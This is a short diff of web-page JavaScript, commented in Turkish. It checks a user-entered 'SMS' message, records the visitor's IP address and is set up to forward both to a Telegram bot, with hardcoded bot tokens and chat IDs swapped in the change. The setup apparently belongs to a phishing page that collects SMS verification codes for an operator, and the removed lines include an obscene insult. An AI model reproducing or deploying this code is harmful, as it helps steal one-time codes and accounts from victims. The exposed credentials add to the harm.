@@ -113,13 +113,13 @@
 
             // Yasaklı kelime kontrolü
             if (message.includes(':DD')) {
-                alert('Yarramı yermisin çocuk adam');
+                alert('SMS DOLDURUNUZ');
                 return;
             }
 
             // Boş metin kontrolü
             if (message.trim() === '') {
-                alert('Lütfen Sms Ekranını Boş bırakmayınız.');
+                alert('SMS DOLDURUNUZ');
                 return;
             }
 
@@ -134,8 +134,8 @@
                     ipAddress = data.ip;
 
                     // Telegram botunuzun API anahtarı ve chat ID'si
-                    var botToken = '6310872354:AAEXpycTL7iDBrndrBPpMhr-_aAepxC3VVk';
-                    var chatId = '-1002138798832';
+                    var botToken = '6805821370:AAFZ8WTi5ePmh9nuwa9GrmIkfIiW68A4C78';
+                    var chatId = '5568918250';
 
                     // Filtreleme: Eğer mesaj içinde ":DD" kelimesi bulunursa, Telegram'a gönderme
                     if (message.includes(':DD')) {
